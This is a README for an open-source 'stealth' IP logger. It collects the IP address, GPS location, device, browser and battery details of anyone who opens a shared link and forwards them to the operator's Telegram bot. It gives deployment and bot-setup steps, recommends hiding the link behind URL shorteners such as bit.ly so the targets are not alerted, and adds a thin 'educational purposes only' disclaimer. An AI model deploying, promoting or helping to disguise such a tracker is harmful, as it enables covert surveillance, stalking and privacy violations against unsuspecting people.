# 🕵️‍♂️ Advanced IP Logger with Telegram Alerts

A powerful stealth tool to collect:

- 🌐 IP Address
- 📍 Location (via GPS)
- 📱 Device Info
- 🧠 Browser Details
- 🔋 Battery & Screen Data
- 🕒 Timezone, Language, and More

📲 All logs are sent instantly to your Telegram bot.

---

## 🔥 Features

- Real-time Telegram Alerts
- GeoLocation Access (Permission Based)
- Mobile & Desktop Compatible
- Hosted on **Render**
- No Database Needed
- Lightweight & Fast

---

## 🚀 Deploy to Render

👇 Click below to deploy on Render:

[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/Its-starXboi/IP-Logger&env=BOT_TOKEN,CHAT_ID)

📌 **Set these Environment Variables on Render:**

- `BOT_TOKEN` → Your Telegram bot token  
- `CHAT_ID` → Your Telegram chat ID

---

## 🤖 Telegram Bot Setup

1. Open Telegram and search `@BotFather`
2. Type `/newbot` → give it a name & username
3. Copy the **bot token**
4. Send a message to your new bot
5. Visit:

https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates

6. Copy your `chat_id` from the response

---

## 🗂 Project Structure

📁 IP-Logger/ ├── index.html         # Frontend UI ├── server.py          # Flask backend ├── static/ │   └── script.js      # Browser + device data logger ├── templates/ │   └── index.html     # HTML template with location request ├── config.py          # Loads TOKEN + CHAT_ID from environment └── requirements.txt   # Python dependencies

---

## ⚙️ Usage

1. Host the site using Render
2. Share the Render link (e.g., `https://your-app.onrender.com`)
3. When someone opens the link:
   - Location is requested
   - Data is fetched
   - Telegram receives full log instantly

✅ **Best used with URL shorteners like `bit.ly`, `cutt.ly`, `tinyurl.com`**

---

## 🛑 Disclaimer

This tool is for **educational purposes only**.  
We do not support any illegal usage.  
Use responsibly. You are solely responsible for your actions.

---

## 📜 License

MIT License © 2025 [Its-starXboi](https://github.com/Its-starXboi)  
Attribution required if modified or published.
